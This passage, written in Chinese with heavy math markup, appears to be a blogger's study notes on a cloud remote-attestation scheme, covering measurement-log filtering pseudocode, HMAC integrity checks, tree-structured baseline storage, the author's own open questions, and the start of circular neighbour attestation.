style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1031em;vertical-align:-0.3531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:-0.0715em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2901em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3531em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.1031em;vertical-align:-0.3531em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>步骤3a：云节点使用背书密钥私钥(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">EK_{pri}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>)解密<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">M_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，如等式(3)中所描述的，以获得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">ke</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>β</mi><mo separator="true">,</mo><mi>k</mi><mi>e</mi><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo>=</mo><mi>D</mi><mi>e</mi><msub><mi>c</mi><mrow><mi>E</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>r</mi><mi>i</mi></mrow></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>M</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(3)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">\beta,ke,nonce=Dec_{EK_{pri}}(M_1)\tag3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0973em;vertical-align:-0.3473em;"></span><span class="mord mathnormal">De</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:-0.0715em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3473em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0973em;vertical-align:-0.3473em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">3</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>云节点随后基于等式(4)验证密文是否损坏。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>H</mi><mi>a</mi><mi>s</mi><mi>h</mi><mo stretchy="false">(</mo><mi>A</mi><mi>I</mi><msub><mi>K</mi><mrow><mi>p</mi><mi>u</mi><mi>b</mi></mrow></msub><mo stretchy="false">)</mo><mo>=</mo><mi>β</mi></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(4)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">Hash(AIK_{pub})=\beta\tag4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span></span><span class="tag"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">4</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>步骤3b：<code>ICA</code>通过设计的过滤机制收集和过滤测量日志( core log，<code>ML</code>)，以导出核心测量日志(core measurement log，<code>CML</code>)，在后部分<strong>Core measurement log</strong>（核心测量日志）中详细描述。然后，<code>ICA</code>使用等式(5)和等式(6)计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，并将其传输到<code>RM</code>。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>C</mi><mi>M</mi><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>L</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(5)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">CML&#x27;=HMAC(CML)\tag5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">5</span></span><span class="mord">)</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>E</mi><mi>n</mi><msub><mi>c</mi><mrow><mi>k</mi><mi>e</mi></mrow></msub><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>C</mi><mi>M</mi><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(6)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">M_2=Enc_{ke}(CML&#x27;,CML,nonce)\tag6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">6</span></span><span class="mord">)</span></span></span></span></span></span></p><ul><li>步骤4a：<code>RM</code>在接收到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>时，使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">ke</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span></span></span></span>来提取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>L</mi><mtext>’</mtext></mrow><annotation encoding="application/x-tex">CML’</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mord">’</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>M</mi><mi>L</mi></mrow><annotation encoding="application/x-tex">CML</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>。步骤4需要<code>RM</code>通过将随机数与步骤2b中的随机数进行匹配来确保<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>M</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">M_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是最新发送的，并检查等式(7)是否成立。如果等式成立，则表明<code>CML</code>完好无损，<code>RM</code>将<code>CML</code>存储在基线值库中。否则，<code>RM</code>会丢弃<code>CML</code>并触发警报。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>C</mi><mi>M</mi><mi>L</mi><mo stretchy="false">)</mo><mo>=</mo><mi>C</mi><mi>M</mi><msup><mi>L</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(7)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">HMAC(CML)=CML&#x27;\tag7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord mathnormal">L</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">CM</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">7</span></span><span class="mord">)</span></span></span></span></span></span></p><h4 id="基值库构建（-Base-Value-Library-Construction）">基值库构建（ Base Value Library Construction）</h4><p><strong>定义1</strong>——临时文件</p><p>通常用于数据存储或计算任务。它的生命周期很短，只存在于相关的任务或会话中，并在完成后自动删除或清除。</p><p><strong>定义2</strong>——核心文件</p><p>如果一个文件可以通过它的文件名在任何时候被访问，那么这个文件就被归类为核心文件。因此，核心测量日志和基线库中的所有文件都是核心文件。</p><ol><li><p>核心测量日志（Core measurement log）</p><p>核心测量日志（<code>CML</code>）的获取算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Input : Measurement Log(ML)</span><br><span class="hljs-comment">//Output: Core Measurement Log(CML)</span><br>Core_Measurement_Log = []<br><span class="hljs-keyword">for</span> each Measurement_log_entry in ML <span class="hljs-keyword">do</span><br>    file_name = extract(Measurement_log_entry)<br>    file_is_exist = file_exsits_in_system(file_name)<br>    <span class="hljs-comment">// If the file exists, put it to the CML; otherwise, skip it</span><br>    <span class="hljs-keyword">if</span> file_is_exist then<br>    Core_Measurement_Log.append(file_name)<br>    end<br>end<br><span class="hljs-keyword">return</span> Core_Measurement_Log(CML)<br></code></pre></td></tr></table></figure><p><code>ICA</code>顺序读取<code>ML</code>中的每个条目，并提取相应的文件路径(即文件名字段)(第2-3行)。然后，它根据提取的文件路径检查Linux系统中是否存在这个文件(第4行)。如果文件存在，它被认为是核心文件，并且<code>ML</code>中的相应条目被添加到<code>CML</code>。如果该文件不存在，它将被视为临时文件，被跳过，并且不会添加到<code>CML</code>中(第5-7行)。在用该算法遍历整个<code>ML</code>之后，生成<code>CML</code>。</p></li><li><p>基线值的存储（Storage of baseline values）</p><p>基线值库由存储在<code>CMC</code>中的多个基线值文件组成。基线值是云节点完成注册后发送给<code>RM</code>的<code>CML</code>。基线值库使用深度为3的多叉树构建，以~~“T”~~为根。在这个结构中，每个子节点代表一个CS，相应的CS的基线值存储在其对应的子节点上。</p><p>每个叶节点代表一个虚拟机(<code>VM</code>)，虚拟机的基准值存储在相应的叶节点上。叶节点的父节点是托管对应于该叶节点的虚拟机的云服务。</p><p>如图</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123133710868.png" alt="image-20241123133710868"></p><p>使用树结构存储基线值参与计算任务的虚拟机和云服务器可以动态地加入或离开。</p></li></ol><h2 id="疑问">疑问</h2><p>临时文件是只存在于相关的任务或会话中，并在完成后自动删除或清除的文件，但是如果在检查的时候临时文件还未完成任务从而未被删除，是不是会误判该文件为核心文件？</p><p>是否是因为临时文件在产生时不会将文件路径（file_name）记录在文件格式中?</p><p>基线值存储时，构建多叉树的根&quot;T&quot;表示的是什么？</p><h3 id="Circular-Remote-attestation">Circular Remote attestation</h3><p><strong>Task Issued</strong></p><p>在云环境中，服务器和虚拟机的位置相对稳定，虚拟机的可信度由虚拟机本身及其主服务器共同决定。根据这一特点，该文提出了一种循环邻居协作认证方法。</p><p>在这种方法中，云服务器既是验证者，又是证明者。如图。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123134537787.png" alt="image-20241123134537787"></p><p><strong>定义3</strong>——远程验证顺序：</p><p>对于给定的云服务器序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mi>i</mi></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi>C</mi><msub><mi>S</mi><mi>n</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(CS_1,CS_2,...,CS_i,...,CS_{n-1},CS_n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 